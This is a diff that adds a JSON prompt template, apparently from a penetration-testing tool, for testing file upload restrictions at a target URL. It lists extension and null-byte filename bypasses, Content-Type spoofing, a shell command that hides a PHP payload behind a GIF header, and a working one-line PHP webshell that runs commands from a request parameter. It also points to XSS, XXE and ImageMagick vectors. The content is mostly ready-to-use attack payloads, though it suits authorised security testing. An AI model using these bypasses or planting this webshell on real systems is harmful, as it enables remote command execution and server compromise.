@@ -1,0 +1,9 @@
+{
+  "name": "File Upload Bypass",
+  "description": "File upload restriction bypass",
+  "category": "web",
+  "variables": [
+    "url"
+  ],
+  "content": "Test file upload restrictions at {url}.\n\n**Extension bypass :**\n```\nshell.php.jpg\nshell.php%00.jpg\nshell.pHp\nshell.php5\nshell.phtml\nshell.php::$DATA\n```\n\n**Content-Type bypass :**\n```\nContent-Type: image/jpeg\nContent-Type: image/gif\n```\n\n**Magic byte bypass :**\n```bash\n# Add a GIF header\necho 'GIF89a' > shell.php.gif\ncat payload.php >> shell.php.gif\n```\n\n**Minimal webshell :**\n```php\n<?=`$_GET[0]`?>\n```\n\n**Other vectors :**\n- SVG with XSS\n- XML with XXE\n- ImageMagick exploits\n- Polyglot files\n\nCheck where the file is stored and whether it is executable."
+}
